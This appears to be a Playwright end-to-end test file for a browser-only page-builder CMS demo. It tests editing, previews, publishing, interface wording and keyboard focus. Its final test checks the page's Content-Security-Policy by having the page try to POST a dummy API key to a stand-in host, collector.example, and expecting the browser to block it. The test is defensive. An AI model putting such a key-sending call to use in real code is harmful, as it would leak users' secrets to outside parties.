  await view.getByRole("navigation", { name: "Main" }).getByRole("link", { name: "Notices", exact: true }).first().click();
  await view.waitForURL(`${baseURL}${DEMO_BASE}?published=${NOTICES}`);
  await expect(view.getByRole("heading", { level: 1, name: "Notices" })).toBeVisible();
  expect(await partsOf(view)).toEqual(changed);
  await shoot(view, "demo-header-published");

  // A click on the page dimmed around the header goes back to it, the new
  // header around it.
  await clickOn(page, ".canvas [data-around-page]", 40);
  await expect(page.getByRole("button", { name: "Switch page. Open: Slack Water" })).toBeVisible();
  await expect(page.locator(`${CANVAS.header} .w-logo-link span`)).toHaveText(changed.name);

  // The preview draws the parts' drafts: the footer's logo named and not
  // published shows there, around the home page, and not on the page as
  // published.
  await clickOn(page, CANVAS.footer);
  await expect(page.getByRole("button", { name: "Switch page. Open: Footer" })).toBeVisible();
  await block(page, "footer-logo").click();
  await page.getByLabel("Site name").fill("Eelgrass Bay Swim Club");
  await page.getByLabel("Site name").blur();
  await saved(page);
  const previewed = context.waitForEvent("page");
  await page.getByRole("link", { name: "Preview" }).click();
  const preview = await previewed;
  await preview.waitForURL(/\?preview=\d+$/);
  await expect(preview.getByRole("complementary", { name: "About this page" })).toHaveText(PREVIEW_LINE);
  await expect(preview.getByRole("heading", { level: 1 }).first()).toBeVisible();
  const shown = await partsOf(preview);
  expect({ ...shown, footer: null }).toEqual({ ...changed, footer: null });
  // The logo's name, then the footer's words, whatever space the markup
  // leaves between the two columns.
  expect(shown.footer.replace(/\s/g, "")).toBe(`Eelgrass Bay Swim Club${changed.footer}`.replace(/\s/g, ""));
  await view.goto(`${DEMO_BASE}?published=${HOME}`);
  expect(await partsOf(view)).toEqual(changed);

  // Kept in this browser: after a reload, the footer opens as it was
  // left, and the canvas around the home page has the header as edited.
  await page.reload();
  await expect(page.getByRole("button", { name: "Switch page. Open: Footer" })).toBeVisible({ timeout: 30_000 });
  await expect(page.locator('.canvas [data-editing-part="footer"] .w-logo-link span')).toHaveText("Eelgrass Bay Swim Club");
  await page.goto(`${DEMO_BASE}?page=${HOME}`);
  await expect(page.locator(`${CANVAS.header} .w-logo-link span`)).toHaveText(changed.name, { timeout: 30_000 });
  expect((await partsOf(page, CANVAS)).links).toEqual(changed.links);
});

// What the demo's screens say that only the full system does: visitors, a
// live page, a server, the CMS, Rails, search engines, a cache. A line that
// says one of them has to say it is the full system's. The product's own
// name is no claim, and the page being edited is the person's words, not
// the editor's.
const PROMISES = /\bvisitors?\b|\blive\b|\bservers?\b|\bCMS\b|\bRails\b|search engines?|\bcache\b/i;
const EXPLAINED = /full system|full CMS/i;
// Advice on writing a page, true wherever the page ends up.
const ADVICE = /^Use one H1 per page\./;

// Each screen's findings are kept and reported together at the end.
async function promisesNothing(page: Page, where: string, found: string[]): Promise<void> {
  const seen = await page.evaluate(() => {
    const lines: string[] = [];
    const skip = (element: Element | null) => element?.closest(".canvas, script, style, [aria-label='About this demo']") != null;
    const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    for (let node = walker.nextNode(); node; node = walker.nextNode()) if (!skip(node.parentElement)) lines.push(node.textContent ?? "");
    for (const element of document.querySelectorAll("[title], [aria-label]")) {
      if (skip(element)) continue;
      lines.push(element.getAttribute("title") ?? "", element.getAttribute("aria-label") ?? "");
    }
    return lines;
  });
  const lines = seen.map((line) => line.replaceAll("Page Builder CMS", "").trim()).filter((line) => line !== "" && PROMISES.test(line) && !EXPLAINED.test(line) && !ADVICE.test(line));
  found.push(...[...new Set(lines)].map((line) => `${where}: ${line}`));
}

test("the screens promise nothing the browser cannot do: no visitor, live page or server, except where the full system is named", async ({ page, context }) => {
  const found: string[] = [];
  await openDemo(page);
  // The page's own settings, the home page.
  await page.getByRole("complementary", { name: "Settings" }).getByRole("tab", { name: "Page" }).click();
  const address = page.getByLabel("Address");
  await expect(address).toBeVisible();
  await expect(page.getByText("This is the home page. In the full system, visitors find it at the site’s root address, /.")).toBeVisible();
  await expect(page.locator(".ed-title")).toContainText("The home page of the site");
  await promisesNothing(page, "the Page tab of the home page", found);
  // The header, open as a page is, from the Page tab, and back.
  await page.getByRole("complementary", { name: "Settings" }).getByRole("button", { name: "Header", exact: true }).click();
  await expect(page.getByRole("button", { name: "Switch page. Open: Header" })).toBeVisible();
  await expect(page.locator(".part-panel")).toContainText(PART_LINE);
  await promisesNothing(page, "the header's Page tab", found);
  await page.getByRole("button", { name: "More publish options" }).click();
  await promisesNothing(page, "the header's Publish menu", found);
  await page.keyboard.press("Escape");
  await page.getByRole("button", { name: "Back to Slack Water" }).click();
  await expect(address).toBeVisible();

  // Another page, published, with a next address that differs: published
  // here, and nothing redirects.
  await page.getByRole("button", { name: "Switch page. Open: Slack Water" }).click();
  await page.getByRole("dialog", { name: "Pages" }).getByRole("button", { name: /^Winter series/ }).click();
  await expect(page.getByRole("button", { name: "Switch page. Open: Winter series" })).toBeVisible();
  await expect(page.getByText("Published in this browser as /winter-series.")).toBeVisible();
  await address.fill("winter-swims");
  await address.press("Enter");
  await expect(page.getByText("Published in this browser as /winter-series; the next publish uses /winter-swims.")).toBeVisible();
  await expect(page.locator(".tb-status")).toHaveText("Published, new address to publish");
  await promisesNothing(page, "the Page tab with a next address", found);

  await page.getByRole("button", { name: "Switch page. Open: Winter series" }).click();
  await promisesNothing(page, "the list of pages", found);
  await page.getByRole("dialog", { name: "Pages" }).getByRole("button", { name: /^Slack Water/ }).click();
  await expect(page.getByRole("button", { name: "Switch page. Open: Slack Water" })).toBeVisible();
  await expect(block(page, "hero-heading")).toBeVisible();

  // The history, with a published version and a change since.
  await retitleHero(page, "Swim when the tide stands still");
  await saved(page);
  const opened = context.waitForEvent("page");
  await page.getByRole("button", { name: "Publish", exact: true }).click();
  await (await opened).close();
  await expect(notice(page)).toContainText(PUBLISHED_LINE);
  await promisesNothing(page, "the notice after Publish", found);
  await page.locator(".topbar").getByRole("button", { name: "History", exact: true }).click();
  const history = page.getByRole("complementary", { name: "History", exact: true });
  await expect(history).toContainText("The same as the published page");
  await promisesNothing(page, "the history of a page just published", found);
  await retitleHero(page, "Swim when the tide has turned");
  await saved(page);
  await expect(page.locator(".tb-status")).toHaveText("Published, 1 change to publish");
  await promisesNothing(page, "the top bar with a change not published", found);
  await expect(history).toContainText("1 change not published yet");
  await expect(history).toContainText("latest publish");
  await expect(history).toContainText("Restoring copies that version into your draft. The published page stays as it is until you publish.");
  await promisesNothing(page, "the history", found);

  // The menus and the dialogs a person opens.
  await page.getByRole("button", { name: "More publish options" }).click();
  await promisesNothing(page, "the Publish menu", found);
  await page.keyboard.press("Escape");
  await page.getByRole("button", { name: "Switch page. Open: Slack Water" }).click();
  await page.getByRole("dialog", { name: "Pages" }).getByRole("button", { name: "New page" }).click();
  await expect(page.getByText("In the full system, visitors find the page there once it is published.")).toBeVisible();
  await promisesNothing(page, "the New page dialog", found);
  await page.keyboard.press("Escape");
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Media library" }).click();
  const library = page.getByRole("dialog", { name: "Media library" });
  await library.getByRole("radio", { name: /^hero-dawn\.png, / }).click();
  await library.getByRole("button", { name: "Delete from library" }).click();
  await expect(library.getByRole("group", { name: "Delete hero-dawn.png" })).toContainText("This browser keeps it while a page or a kept version shows it.");
  await promisesNothing(page, "the Media library", found);
  await page.keyboard.press("Escape");
  await page.keyboard.press("Escape");
  // The Shop: its settings, with what the full system's checkout does, and
  // its orders, none yet.
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Shop" }).click();
  const shop = page.getByRole("dialog", { name: "Shop" });
  await expect(shop.getByText(/^In the full system, the CMS sends each checkout to Stripe's page/)).toBeVisible();
  await promisesNothing(page, "the Shop's settings", found);
  await shop.getByRole("button", { name: /^Orders/ }).click();
  await expect(shop.locator(".shop-empty-title")).toHaveText("No orders yet");
  await promisesNothing(page, "the Shop's orders", found);
  await shop.getByRole("button", { name: "Close", exact: true }).click();
  // Collections: the example site's News, which says where its entries
  // are; then a new one's form, which says where its entries would be.
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Collections" }).click();
  const collections = page.getByRole("dialog", { name: "Collections" });
  await expect(collections.getByText("In the full system, entries are at /news/<slug> once published.")).toBeVisible();
  await promisesNothing(page, "Collections, with News", found);
  await collections.getByRole("button", { name: "New collection" }).click();
  await collections.getByRole("textbox", { name: /^Name/ }).fill("Events");
  await collections.getByRole("textbox", { name: /^Name/ }).press("Tab");
  await expect(collections.getByText("Lowercase letters, digits and hyphens. In the full system, entries are at /events/<slug> once published.")).toBeVisible();
  await promisesNothing(page, "a new collection", found);
  expect(found, "what the screens say that only the full system does").toEqual([]);
});

test("a large image is refused in this browser's words, not a CMS's", async ({ page }) => {
  await openDemo(page);
  await page.getByRole("button", { name: "Page Builder CMS menu" }).click();
  await page.getByRole("menuitem", { name: "Media library" }).click();
  const dialog = page.getByRole("dialog", { name: "Media library" });
  // 4000 by 3000 of noise, the high bits of a 32-bit generator: it does not
  // compress, and after the editor draws it again at 2400 pixels it is
  // still larger than the 10 MB the storage keeps.
  let seed = 11;
  const noise = () => (seed = (Math.imul(seed, 1664525) + 1013904223) >>> 0) >>> 24;
  await dialog.getByLabel("Images to upload").setInputFiles({ name: "wall-of-noise.png", mimeType: "image/png", buffer: png(4000, 3000, () => [noise(), noise(), noise()]) });
  await expect(dialog.getByText(/This browser keeps images up to 10 MB: ready to go up it is [\d.]+ MB\. Save it as JPEG or WebP, or crop it, and upload it again\./)).toBeVisible({ timeout: 60_000 });
  expect(await dialog.innerText()).not.toMatch(/The CMS/);
});

test("the notice that says how Publish went can be closed from the keyboard, and the focus stays where it was", async ({ page, context }) => {
  await openDemo(page);
  const publish = page.getByRole("button", { name: "Publish", exact: true });
  const ways = [["focus", "Enter"], ["focus", "Space"], ["Tab", "Enter"], ["Tab", "Space"]] as const;
  for (const [reach, key] of ways) {
    await publish.focus();
    const opened = context.waitForEvent("page");
    await page.keyboard.press("Enter");
    await (await opened).close();
    await expect(notice(page)).toContainText(PUBLISHED_LINE);
    const dismiss = notice(page).getByRole("button", { name: "Dismiss" });
    if (reach === "focus") await dismiss.focus();
    else {
      // As a keyboard reaches it: Tab after Tab from Publish, through the
      // whole editor and the demo's bottom line, which the notice follows.
      await expect(publish).toBeFocused();
      const source = page.locator(".demo-line").getByRole("link", { name: "Source on GitHub" });
      const on = (control: typeof dismiss) => control.evaluate((element) => element === document.activeElement);
      let steps = 0;
      let passedSource = false;
      while (!(await on(dismiss))) {
        steps += 1;
        expect(steps, "Tab presses from Publish to Dismiss").toBeLessThanOrEqual(80);
        await page.keyboard.press("Tab");
        passedSource ||= await on(source);
      }
      expect(passedSource, "the walk passes the demo's bottom line on its way").toBe(true);
    }
    await page.keyboard.press(key);
    await expect(notice(page)).toHaveCount(0);
    // Not on the document, nor on the bottom line's link, the last step of
    // the walk: the control it came from, and the next Tab goes on from
    // there, not from the top of the page or out of it.
    await expect(publish).toBeFocused();
    expect(await page.evaluate(() => document.activeElement === document.body)).toBe(false);
    await page.keyboard.press("Tab");
    await expect(page.getByRole("button", { name: "More publish options" })).toBeFocused();
  }
});


// The Assistant's promise (src/assistant/README.md), as the browser keeps
// it: the page's policy lets it connect to its own site and the two
// providers' APIs only, so a key pasted here cannot be sent anywhere else,
// whatever runs on the page. In a context of its own: the browser's line
// for the refusal the test asks for is an error, which this file's watch
// counts.
test("the page connects only to its own site and the two providers' APIs: a connection anywhere else is refused by the browser itself", async ({ browser, baseURL }) => {
  const context = await browser.newContext({ baseURL: baseURL ?? "" });
  try {
    const page = await context.newPage();
    await openDemo(page);
    const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute("content");
    expect(policy).toContain("connect-src 'self' blob: https://api.anthropic.com https://api.openai.com;");
    const outcome = await page.evaluate(async () => {
      const refused: string[] = [];
      document.addEventListener("securitypolicyviolation", (event) => refused.push(event.effectiveDirective));
      let sent = true;
      try {
        await fetch("https://collector.example/keys", { method: "POST", body: "sk-ant-not-a-real-key" });
      } catch {
        sent = false;
      }
      await new Promise((done) => setTimeout(done, 100));
      return { sent, refused };
    });
    expect(outcome).toEqual({ sent: false, refused: ["connect-src"] });
  } finally {
    await context.close();
  }
});
